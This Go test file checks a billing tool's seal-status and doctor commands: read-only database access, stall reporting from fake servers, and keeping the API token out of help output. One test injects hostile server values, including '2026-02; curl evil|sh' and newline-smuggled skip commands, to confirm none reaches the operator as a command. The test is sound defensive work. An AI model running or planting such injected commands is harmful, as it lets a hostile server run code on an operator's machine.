package main

import (
	"bytes"
	"context"
	"database/sql"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/tiermetric/tier/internal/api"
	"github.com/tiermetric/tier/internal/store"
)

// sealManifestServer is a fake tierd that answers 401 unless the request
// carries `Authorization: Bearer tok`; its /api/v1/report_manifest answers
// status with body, and its /api/v1/scores answers 200 with a price stamp.
func sealManifestServer(t *testing.T, status int, body string) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer tok" {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		if r.URL.Path == "/api/v1/report_manifest" {
			w.WriteHeader(status)
			_, _ = w.Write([]byte(body))
			return
		}
		_, _ = w.Write([]byte(`{"price_table":{"version":` + strconv.Itoa(store.ActivePriceTableInfo().Version) + `}}`))
	}))
	t.Cleanup(srv.Close)
	return srv
}

// stallManifest is a sealed manifest naming stalled (none when "").
func stallManifest(stalled, reason string) string {
	return stallManifestOwed(stalled, reason, "2026-03-15T00:00:00Z")
}

// stallManifestOwed is stallManifest with owed_since set to owed.
func stallManifestOwed(stalled, reason, owed string) string {
	b := fmt.Sprintf(`{"manifest_schema":%q,"period":"2026-01"`, api.SealedManifestSchema)
	if stalled != "" {
		b += fmt.Sprintf(`,"stalled_period":%q,"stall_reason":%q,"owed_since":%q`, stalled, reason, owed)
	}
	return b + "}"
}

// sealed404 is the sealed 404 a server answers while no month is sealed,
// naming stalled as its stall (none when "").
func sealed404(month, stalled string) string {
	b := fmt.Sprintf(`{"error":"x","aggregation":"team","period":%q`, month)
	if stalled != "" {
		b += fmt.Sprintf(`,"stalled_period":%q,"stall_reason":"unreported","owed_since":"2026-03-15T00:00:00Z"`, stalled)
	}
	return b + "}"
}

// rawExec runs one statement on the database at path outside the store.
func rawExec(t *testing.T, path, stmt string) {
	t.Helper()
	raw, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = raw.Close() }()
	if _, err := raw.Exec(stmt); err != nil {
		t.Fatal(err)
	}
}

func webhookRows(t *testing.T, path string) (n int) {
	t.Helper()
	raw, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = raw.Close() }()
	if err := raw.QueryRow(`SELECT COUNT(*) FROM webhook_payloads`).Scan(&n); err != nil {
		t.Fatal(err)
	}
	return n
}

// dirNames is the sorted names in dir.
func dirNames(t *testing.T, dir string) []string {
	t.Helper()
	ents, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	var names []string
	for _, e := range ents {
		names = append(names, e.Name())
	}
	return names
}

// TestSealStatusCmd_OpensReadOnly (#913-D8 condition 6): --status leaves the
// database file's bytes and mtime and its webhook_payloads rows as they were,
// though store.Open prunes the row it holds (the control below). The only files
// it may add are the empty -wal and -shm SQLite needs to read a cleanly closed
// WAL database.
func TestSealStatusCmd_OpensReadOnly(t *testing.T) {
	path := armedSealTestDB(t)
	rawExec(t, path, `INSERT INTO webhook_payloads (event, body_gz, body_sha256, received_at) VALUES ('push', x'00', 'x', '2000-01-01 00:00:00')`)
	before, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	beforeBytes, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	beforeNames := dirNames(t, filepath.Dir(path))
	rc, out, errOut := runSeal(t, "", "--status", "--aggregation", "team", "--db", path)
	if rc != sealExitStallUnknown {
		t.Fatalf("rc %d, want %d; stdout %q stderr %q", rc, sealExitStallUnknown, out, errOut)
	}
	after, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	afterBytes, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !after.ModTime().Equal(before.ModTime()) || !bytes.Equal(afterBytes, beforeBytes) {
		t.Errorf("db file changed: mtime %v -> %v, size %d -> %d", before.ModTime(), after.ModTime(), len(beforeBytes), len(afterBytes))
	}
	allowed := map[string]bool{"tier.db-wal": true, "tier.db-shm": true}
	for _, n := range beforeNames {
		allowed[n] = true
	}
	for _, n := range dirNames(t, filepath.Dir(path)) {
		if !allowed[n] {
			t.Errorf("--status created %s beside the database (had %v)", n, beforeNames)
		}
	}
	if fi, err := os.Stat(path + "-wal"); err == nil && fi.Size() != 0 {
		t.Errorf("--status left a -wal of %d bytes, want none or empty", fi.Size())
	}
	if n := webhookRows(t, path); n != 1 {
		t.Errorf("webhook_payloads rows after --status = %d, want 1", n)
	}
	db, err := store.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	_ = db.Close()
	if n := webhookRows(t, path); n != 0 {
		t.Fatalf("control: store.Open left %d webhook_payloads rows, want the expired row pruned", n)
	}
}

// TestSealStatusCmd_Overdue: an armed database whose next month is overdue
// prints the state from the database and the skip command for the month. It
// exits stalled only when a reached server names that month (#913-D8 condition
// 7), and unknown without a server or when the server names no stall.
func TestSealStatusCmd_Overdue(t *testing.T) {
	path := armedSealTestDB(t)
	first, next := sealTestMonth().Format("2006-01"), skipMonth()
	rc, out, _ := runSeal(t, "", "--status", "--aggregation", "team", "--db", path)
	for _, want := range []string{
		"armed:                         yes, by the first seal\n",
		"pinned floor:                  " + first + "\n",
		"newest sealed or gapped month: " + first + "\n",
		"first owed month:              " + next + ", sealable at ",
		"overdue:                       yes: " + next,
		"stall reason:                  UNKNOWN (server not reached)",
		"\n  " + sealSkipCommand(next) + "\n",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("stdout lacks %q:\n%s", want, out)
		}
	}
	if rc != sealExitStallUnknown {
		t.Errorf("rc %d, want %d", rc, sealExitStallUnknown)
	}
	rc, out, _ = runSeal(t, "", "--status", "--aggregation", "team", "--db", path, "--read-only")
	if rc != sealExitStallUnknown || strings.Contains(out, "tierd seal --skip") || !strings.Contains(out, "read-only server never seals") {
		t.Errorf("read-only: rc %d, stdout %q; want %d and no skip command", rc, out, sealExitStallUnknown)
	}
	srv := sealManifestServer(t, http.StatusOK, stallManifest(next, "write_lock_busy"))
	rc, out, _ = runSeal(t, "", "--status", "--aggregation", "team", "--db", path, "--server", srv.URL, "--api-token", "tok")
	if rc != sealExitStalled || !strings.Contains(out, `stall reason:                  "write_lock_busy" (the database write lock was busy), as the server reported it`) ||
		!strings.Contains(out, "\n  "+sealSkipCommand(next)+"\n") {
		t.Errorf("server names %s: rc %d, stdout %q", next, rc, out)
	}
	srv = sealManifestServer(t, http.StatusOK, stallManifest("", ""))
	rc, out, _ = runSeal(t, "", "--status", "--aggregation", "team", "--db", path, "--server", srv.URL, "--api-token", "tok")
	if rc != sealExitStallUnknown || !strings.Contains(out, "UNKNOWN (the server names no stalled month, but this database shows "+next+" owed") ||
		!strings.Contains(out, "\n  "+sealSkipCommand(next)+"\n") {
		t.Errorf("server names no stall while the database shows %s overdue: rc %d, stdout %q; want %d", next, rc, out, sealExitStallUnknown)
	}
}

// TestSealStatusCmd_StallUnknownUntilServerAnswers: the first owed month is
// sealable but not yet overdue, so only the server knows whether a pass failed
// on it. Without a server, or with an unreachable one, the exit is unknown,
// never not-stalled.
func TestSealStatusCmd_StallUnknownUntilServerAnswers(t *testing.T) {
	path := armedSealTestDB(t)
	next, err := api.ParseSealMonth(skipMonth())
	if err != nil {
		t.Fatal(err)
	}
	// A grace putting next's sealable_at 30 minutes ago: due, not overdue.
	grace := time.Until(next.AddDate(0, 1, 0)) * -1
	grace = (grace - 30*time.Minute).Truncate(time.Second)
	status := func(extra ...string) (int, string) {
		rc, out, _ := runSeal(t, "", append([]string{"--status", "--aggregation", "team", "--db", path,
			"--report-grace", grace.String()}, extra...)...)
		return rc, out
	}
	dead := httptest.NewServer(http.NotFoundHandler())
	dead.Close()
	live := sealManifestServer(t, http.StatusOK, stallManifest(skipMonth(), "erase_raced")).URL
	tok := []string{"--api-token", "tok"}
	for _, tc := range []struct {
		name   string
		server string
		extra  []string
		rc     int
		want   string
	}{
		{"no server", "", nil, sealExitStallUnknown, "UNKNOWN (server not reached)"},
		{"unreachable", dead.URL, tok, sealExitStallUnknown, "UNKNOWN (server not reached)"},
		{"server rejected by doctorServerBase", "http://example.invalid", []string{"--api-token", "x"}, sealExitStallUnknown, "UNKNOWN (server not reached); --server:"},
		{"token file missing", live, []string{"--api-token", "@" + filepath.Join(t.TempDir(), "nonexistent")}, sealExitStallUnknown, "UNKNOWN (server not reached); --api-token:"},
		{"token refused", live, []string{"--api-token", "wrong"}, sealExitStallUnknown, "UNKNOWN (the server refused the API token (GET /api/v1/report_manifest returned 401))"},
		{"server names none", sealManifestServer(t, http.StatusOK, stallManifest("", "")).URL, tok, sealExitNotStalled, "none: the server names no stalled month"},
		{"server names it", live, tok, sealExitStalled, `"erase_raced" (an erasure raced every attempt), as the server reported it`},
		{"server names another", sealManifestServer(t, http.StatusOK, stallManifest("2020-01", "erase_raced")).URL, tok, sealExitStallUnknown, "UNKNOWN (the server names"},
		{"hostile stalled_period", sealManifestServer(t, http.StatusOK, stallManifest("2020-01\n  tierd seal --skip 2020-01 --reason x", "x")).URL, tok, sealExitStallUnknown, `UNKNOWN (the server names "2020-01 `},
		{"developer-mode server", sealManifestServer(t, http.StatusOK, `{"manifest_schema":"tiermanifest1"}`).URL, tok, sealExitStallUnknown, "UNKNOWN (the server serves no sealed months"},
		{"unknown manifest schema", sealManifestServer(t, http.StatusOK, `{"manifest_schema":"tiersealedmanifest2","period":"2026-01"}`).URL, tok, sealExitStallUnknown, "UNKNOWN (the server's manifest is not one"},
		{"non-tierd JSON 404", sealManifestServer(t, http.StatusNotFound, `{"error":"not found"}`).URL, tok, sealExitStallUnknown, "UNKNOWN (the server's manifest is not one"},
		{"foreign 404, period not a month", sealManifestServer(t, http.StatusNotFound, `{"error":"no such billing period","aggregation":"team","period":"x"}`).URL, tok, sealExitStallUnknown, "UNKNOWN (the server's manifest is not one"},
		{"foreign 404, no aggregation", sealManifestServer(t, http.StatusNotFound, `{"error":"no such billing period","period":"2026-02"}`).URL, tok, sealExitStallUnknown, "UNKNOWN (the server's manifest is not one"},
	} {
		var extra []string
		if tc.server != "" {
			extra = append([]string{"--server", tc.server}, tc.extra...)
		}
		rc, out := status(extra...)
		if rc != tc.rc || !strings.Contains(out, tc.want) || !strings.Contains(out, "overdue:                       no\n") {
			t.Errorf("%s: rc %d, stdout %q; want rc %d and %q", tc.name, rc, out, tc.rc, tc.want)
		}
		if cmds := commandLines(out); rc != sealExitStalled && len(cmds) != 0 {
			t.Errorf("%s: command lines %q for a month that is not stalled, want none", tc.name, cmds)
		}
	}
}

// TestSealStatusCmd_NothingSealable: with the first owed month not yet
// sealable, --status is not stalled without a server and with one naming no
// stall, and unknown when --server was given but not reached, or names a stall
// the database does not show (a grace or seal_from mismatch) (#913-D8
// condition 7).
func TestSealStatusCmd_NothingSealable(t *testing.T) {
	path := armedSealTestDB(t)
	dead := httptest.NewServer(http.NotFoundHandler())
	dead.Close()
	for _, tc := range []struct {
		name, server string
		rc           int
		want         string
	}{
		{"no server", "", sealExitNotStalled, "stall reason:                  none: no owed month is sealable yet\n"},
		{"server names none", sealManifestServer(t, http.StatusOK, stallManifest("", "")).URL, sealExitNotStalled, "none: no owed month is sealable yet, and the server names no stalled month"},
		{"server names a stall", sealManifestServer(t, http.StatusOK, stallManifest(skipMonth(), "clock_behind")).URL, sealExitStallUnknown,
			"UNKNOWN (the server names \"" + skipMonth() + "\", but this database shows no owed month sealable yet"},
		{"unreachable", dead.URL, sealExitStallUnknown, "UNKNOWN (server not reached)"},
	} {
		args := []string{"--status", "--aggregation", "team", "--db", path, "--report-grace", "2400h"}
		if tc.server != "" {
			args = append(args, "--server", tc.server, "--api-token", "tok")
		}
		rc, out, _ := runSeal(t, "", args...)
		if rc != tc.rc || !strings.Contains(out, tc.want) || !strings.Contains(out, "first owed month:              "+skipMonth()+", sealable at ") {
			t.Errorf("%s: rc %d, stdout %q; want rc %d and %q", tc.name, rc, out, tc.rc, tc.want)
		}
	}
}

// TestSealStatusCmd_NotArmed: an unarmed database says so and is not stalled
// without a server, but unknown when a server serving it armed by seal_from
// names a stall (#913-D8 condition 7).
func TestSealStatusCmd_NotArmed(t *testing.T) {
	path := sealTestDB(t)
	first := sealTestMonth().Format("2006-01")
	rc, out, _ := runSeal(t, "", "--status", "--aggregation", "team", "--db", path)
	if rc != sealExitNotStalled || !strings.Contains(out, "armed:                         no: no month is sealed until `tierd seal --arm YYYY-MM|earliest` is run\n") {
		t.Errorf("unarmed: rc %d, stdout %q; want %d and armed: no", rc, out, sealExitNotStalled)
	}
	srv := sealManifestServer(t, http.StatusNotFound, sealed404(first, first))
	rc, out, _ = runSeal(t, "", "--status", "--aggregation", "team", "--db", path, "--server", srv.URL, "--api-token", "tok")
	if rc != sealExitStallUnknown || !strings.Contains(out, "UNKNOWN (the server names \""+first+"\", but this database shows no owed month sealable yet") {
		t.Errorf("unarmed, server names %s: rc %d, stdout %q; want %d", first, rc, out, sealExitStallUnknown)
	}
}

// TestSealStatusCmd_SealFromFirstMonth: armed by seal_from with nothing
// sealed, the overdue first month has no skip command, since --skip refuses
// the first month; it is unknown without a server and stalled when the
// server's sealed 404 names it.
func TestSealStatusCmd_SealFromFirstMonth(t *testing.T) {
	path := sealTestDB(t)
	first := sealTestMonth().Format("2006-01")
	base := []string{"--status", "--aggregation", "team", "--db", path, "--seal-from", first}
	srv := sealManifestServer(t, http.StatusNotFound, sealed404(first, first))
	for _, tc := range []struct {
		name  string
		extra []string
		rc    int
	}{
		{"no server", nil, sealExitStallUnknown},
		{"server names it", []string{"--server", srv.URL, "--api-token", "tok"}, sealExitStalled},
	} {
		rc, out, _ := runSeal(t, "", append(append([]string{}, base...), tc.extra...)...)
		for _, want := range []string{
			"armed:                         yes, by seal_from " + first + " (flag --seal-from); no month is sealed yet\n",
			"overdue:                       yes: " + first,
			"skip:                          none: " + first + " is the first month sealed, which cannot be skipped\n",
		} {
			if !strings.Contains(out, want) {
				t.Errorf("%s: stdout lacks %q:\n%s", tc.name, want, out)
			}
		}
		if rc != tc.rc || strings.Contains(out, "tierd seal --skip") {
			t.Errorf("%s: rc %d, stdout %q; want %d and no skip command", tc.name, rc, out, tc.rc)
		}
	}
}

// TestSealCmd_TokenNotInUsage (#237 R1's rule): TIER_API_TOKEN is never
// printed by --help or a flag error, and is still the --api-token default.
func TestSealCmd_TokenNotInUsage(t *testing.T) {
	for _, v := range []string{"TIER_PRICES", "TIER_READ_ONLY", "TIER_AGGREGATION", "TIER_K_ANONYMITY", "TIER_REPORT_GRACE", "TIER_SEAL_FROM"} {
		t.Setenv(v, "")
	}
	const sentinel = "sentinel-token-5f3a"
	t.Setenv("TIER_API_TOKEN", sentinel)
	for _, args := range [][]string{{"--help"}, {"--bogus"}} {
		var out, errOut bytes.Buffer
		runSealCmd(args, strings.NewReader(""), &out, &errOut)
		if strings.Contains(out.String()+errOut.String(), sentinel) {
			t.Errorf("%v printed TIER_API_TOKEN:\n%s%s", args, out.String(), errOut.String())
		}
	}
	path := armedSealTestDB(t)
	t.Setenv("TIER_API_TOKEN", "tok")
	srv := sealManifestServer(t, http.StatusOK, stallManifest(skipMonth(), "clock_behind"))
	var out, errOut bytes.Buffer
	rc := runSealCmd([]string{"--status", "--aggregation", "team", "--db", path, "--server", srv.URL}, strings.NewReader(""), &out, &errOut)
	if rc != sealExitStalled {
		t.Errorf("TIER_API_TOKEN as the default: rc %d, stdout %q, stderr %q; want %d", rc, out.String(), errOut.String(), sealExitStalled)
	}
}

// TestSealStatusCmd_Refusals: --status refuses a database at another schema
// version without migrating it, flags that do not apply to it, and a missing
// database; --server is refused without --status.
func TestSealStatusCmd_Refusals(t *testing.T) {
	path := armedSealTestDB(t)
	rawExec(t, path, `PRAGMA user_version = 4`)
	rc, _, errOut := runSeal(t, "", "--status", "--aggregation", "team", "--db", path)
	if rc != sealExitRefused || !strings.Contains(errOut, "schema version 4") {
		t.Errorf("older schema: rc %d, stderr %q; want %d naming version 4", rc, errOut, sealExitRefused)
	}
	raw, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	var v int
	if err := raw.QueryRow(`PRAGMA user_version`).Scan(&v); err != nil || v != 4 {
		t.Errorf("user_version after --status = %d (%v), want 4: --status must not migrate", v, err)
	}
	_ = raw.Close()
	newer := armedSealTestDB(t)
	raw, err = sql.Open("sqlite", newer)
	if err != nil {
		t.Fatal(err)
	}
	var cur int
	if err := raw.QueryRow(`PRAGMA user_version`).Scan(&cur); err != nil {
		t.Fatal(err)
	}
	_ = raw.Close()
	rawExec(t, newer, fmt.Sprintf(`PRAGMA user_version = %d`, cur+1))
	rc, _, errOut = runSeal(t, "", "--status", "--aggregation", "team", "--db", newer)
	if rc != sealExitRefused || !strings.Contains(errOut, fmt.Sprintf("schema version %d", cur+1)) {
		t.Errorf("newer schema: rc %d, stderr %q; want %d naming version %d", rc, errOut, sealExitRefused, cur+1)
	}
	raw, err = sql.Open("sqlite", newer)
	if err != nil {
		t.Fatal(err)
	}
	if err := raw.QueryRow(`PRAGMA user_version`).Scan(&v); err != nil || v != cur+1 {
		t.Errorf("user_version after --status = %d (%v), want %d", v, err, cur+1)
	}
	_ = raw.Close()
	missing := filepath.Join(t.TempDir(), "missing.db")
	if rc, _, _ := runSeal(t, "", "--status", "--aggregation", "team", "--db", missing); rc != sealExitCannotRun {
		t.Errorf("missing db: rc %d, want %d", rc, sealExitCannotRun)
	}
	if _, err := os.Stat(missing); err == nil {
		t.Error("--status created the missing database")
	}
	for _, args := range [][]string{
		{"--status", "--arm", "earliest"},
		{"--status", "--dry-run"},
		{"--status", "--skip", skipMonth()},
		{"--status", "--reason", "x"},
		{"--status", "--yes"},
		{"--arm", "earliest", "--server", "http://127.0.0.1:1"},
		{"--status", "--aggregation", "developer"},
	} {
		if rc, _, _ := runSeal(t, "", append(args, "--db", path)...); rc != sealExitRefused {
			t.Errorf("%v: rc %d, want %d", args, rc, sealExitRefused)
		}
	}
}

// TestStoreOpenReadOnly_RefusesWrites: the read-only open refuses a write.
func TestStoreOpenReadOnly_RefusesWrites(t *testing.T) {
	path := armedSealTestDB(t)
	db, err := store.OpenReadOnly(path)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = db.Close() }()
	if _, err := db.PruneWebhookPayloads(context.Background()); err == nil {
		t.Error("PruneWebhookPayloads on a read-only open succeeded; want it refused")
	}
}

// doctorOutput runs checkServer against srv and returns the printed report.
func doctorOutput(t *testing.T, srv *httptest.Server) ([]checkResult, string) {
	t.Helper()
	got := checkServer(context.Background(), srv.Client(), srv.URL, "tok", time.Now())
	var buf bytes.Buffer
	reportDoctor(got, &buf)
	return got, buf.String()
}

// TestDoctor_SealStall: doctor WARNs the stall a sealed manifest names, with
// the reason's words and the skip command only when a month is sealed (a 404
// means none is), never FAILing; OK when none is named; WARN "not checked"
// when report_manifest errors or is not a manifest this binary reads; and
// nothing against a server serving a live manifest.
func TestDoctor_SealStall(t *testing.T) {
	got, out := doctorOutput(t, sealManifestServer(t, http.StatusOK, stallManifest("2026-02", "clock_behind")))
	if statusOf(got, "sealing") != statusWarn || strings.Contains(out, "FAIL") ||
		!strings.Contains(out, "\n         command: "+sealSkipCommand("2026-02")+"\n") ||
		!strings.Contains(out, "\n         stall reason (as the server sent it): \"clock_behind\" (the server clock is behind the newest seal)\n") {
		t.Errorf("stall on a sealed manifest:\n%s", out)
	}
	_, out = doctorOutput(t, sealManifestServer(t, http.StatusOK, stallManifest("2026-02", "from_a_newer_binary")))
	if !strings.Contains(out, "\n         stall reason (as the server sent it): \"from_a_newer_binary\"\n") {
		t.Errorf("unknown reason code, want it quoted alone:\n%s", out)
	}
	got, out = doctorOutput(t, sealManifestServer(t, http.StatusNotFound, sealed404("2026-02", "2026-02")))
	if statusOf(got, "sealing") != statusWarn || strings.Contains(out, "tierd seal --skip") || !strings.Contains(out, "cannot be skipped") ||
		!strings.Contains(out, `"unreported" (no seal pass has reported on it`) {
		t.Errorf("stall with nothing sealed:\n%s", out)
	}
	if got, _ := doctorOutput(t, sealManifestServer(t, http.StatusOK, stallManifest("", ""))); statusOf(got, "sealing") != statusOK {
		t.Errorf("no stall: %+v, want sealing OK", got)
	}
	if got, _ := doctorOutput(t, sealManifestServer(t, http.StatusOK, `{"manifest_schema":"tiermanifest1"}`)); statusOf(got, "sealing") != -1 {
		t.Errorf("developer-mode manifest: %+v, want no sealing line", got)
	}
	for _, tc := range []struct {
		name   string
		status int
		body   string
		detail string
	}{
		{"401", http.StatusUnauthorized, "{}", "the server refused the API token"},
		{"403", http.StatusForbidden, "{}", "the server refused the API token"},
		{"500", http.StatusInternalServerError, "{}", "returned 500"},
		{"HTML", http.StatusOK, "<html>proxy</html>", "not one this tierd binary reads"},
		{"unknown manifest schema", http.StatusOK, `{"manifest_schema":"tiersealedmanifest2","period":"2026-01"}`, "not one this tierd binary reads"},
		{"non-tierd JSON 404", http.StatusNotFound, `{"error":"not found"}`, "not one this tierd binary reads"},
		{"foreign 404, period not a month", http.StatusNotFound, `{"error":"no such billing period","aggregation":"team","period":"x"}`, "not one this tierd binary reads"},
		{"foreign 404, no aggregation", http.StatusNotFound, `{"error":"no such billing period","period":"2026-02"}`, "not one this tierd binary reads"},
	} {
		got, _ := doctorOutput(t, sealManifestServer(t, tc.status, tc.body))
		if r := findCheck(t, got, "sealing"); r.status != statusWarn || !strings.Contains(r.detail, "not checked: ") || !strings.Contains(r.detail, tc.detail) {
			t.Errorf("%s: sealing %+v, want WARN not checked naming %q", tc.name, r, tc.detail)
		}
	}
}

// TestDoctor_SealedScores404: a team/division server with nothing sealed
// answers /scores with the sealed 404; doctor does not FAIL it, WARNs the
// price table it could not check, and still reads the sealing state.
func TestDoctor_SealedScores404(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		_, _ = w.Write([]byte(sealed404("2026-02", "")))
	}))
	t.Cleanup(srv.Close)
	got := checkServer(context.Background(), srv.Client(), srv.URL, "", time.Now())
	var buf bytes.Buffer
	if rc := reportDoctor(got, &buf); rc != 0 || statusOf(got, "server reachable") != -1 ||
		statusOf(got, "server auth") != statusOK || statusOf(got, "price table") != statusWarn || statusOf(got, "sealing") != statusOK {
		t.Errorf("sealed 404 on /scores: rc %d\n%s", rc, buf.String())
	}
}

// TestDoctor_SealedScores404ClockAndForeign: the sealed 404 on /scores still
// carries the clock-offset check from its Date header, and a 404 whose body is
// not tierd's sealed 404 (no aggregation, or a period that is not YYYY-MM) is
// not read as one: /scores is then an unexpected status.
func TestDoctor_SealedScores404ClockAndForeign(t *testing.T) {
	serve := func(body string, date time.Time) []checkResult {
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Date", date.UTC().Format(http.TimeFormat))
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusNotFound)
			_, _ = w.Write([]byte(body))
		}))
		t.Cleanup(srv.Close)
		return checkServer(context.Background(), srv.Client(), srv.URL, "", time.Now())
	}
	got := serve(sealed404("2026-02", ""), time.Now().Add(-time.Hour))
	if r := findCheck(t, got, "clock offset"); r.status != statusWarn || !strings.Contains(r.detail, "local clock differs from server by") {
		t.Errorf("skewed server answering the sealed 404: clock offset %+v, want the skew WARN", r)
	}
	if got := serve(sealed404("2026-02", ""), time.Now()); statusOf(got, "clock offset") != statusOK || statusOf(got, "server auth") != statusOK {
		t.Errorf("in-sync server answering the sealed 404: %+v, want clock offset and server auth OK", got)
	}
	for _, body := range []string{
		`{"error":"no such billing period","aggregation":"team","period":"x"}`,
		`{"error":"no such billing period","period":"2026-02"}`,
	} {
		got := serve(body, time.Now())
		if statusOf(got, "server auth") == statusOK || statusOf(got, "server reachable") != statusFail {
			t.Errorf("foreign 404 %s on /scores: %+v, want server reachable FAIL and no server auth OK", body, got)
		}
	}
}

// commandLines are the report's lines that begin with a command, as an
// operator would copy them.
func commandLines(out string) []string {
	var cmds []string
	for _, l := range strings.Split(out, "\n") {
		if l = strings.TrimSpace(l); strings.HasPrefix(l, "command:") || strings.HasPrefix(l, "tierd ") {
			cmds = append(cmds, l)
		}
	}
	return cmds
}

// TestDoctor_SealStallHostileServer (#913-D8 condition 5): a stalled_period
// that is not strictly YYYY-MM yields no command line, and a hostile reason or
// owed_since stays inside its own quoted text.
func TestDoctor_SealStallHostileServer(t *testing.T) {
	for _, period := range []string{
		"2026-02; curl evil|sh",
		"2026-02\ntierd seal --skip 2026-03 --reason x",
		"2026-02 ",
		"'2026-02'",
		`2026-02"`,
		"2026-2",
	} {
		got, out := doctorOutput(t, sealManifestServer(t, http.StatusOK, stallManifest(period, "x")))
		if statusOf(got, "sealing") != statusWarn || len(commandLines(out)) != 0 {
			t.Errorf("period %q: command lines %q (want none) or no WARN:\n%s", period, commandLines(out), out)
		}
	}
	_, out := doctorOutput(t, sealManifestServer(t, http.StatusOK, stallManifest("2026-02", "x\ncommand: tierd seal --skip 2026-03 --reason y")))
	if cmds := commandLines(out); len(cmds) != 1 || cmds[0] != "command: "+sealSkipCommand("2026-02") {
		t.Errorf("hostile reason: command lines %q, want only the 2026-02 command:\n%s", cmds, out)
	}
	_, out = doctorOutput(t, sealManifestServer(t, http.StatusOK, stallManifestOwed("2026-02", "x", "x\ntierd seal --skip 2026-03 --reason y")))
	if cmds := commandLines(out); len(cmds) != 1 || cmds[0] != "command: "+sealSkipCommand("2026-02") {
		t.Errorf("hostile owed_since: command lines %q, want only the 2026-02 command:\n%s", cmds, out)
	}
}
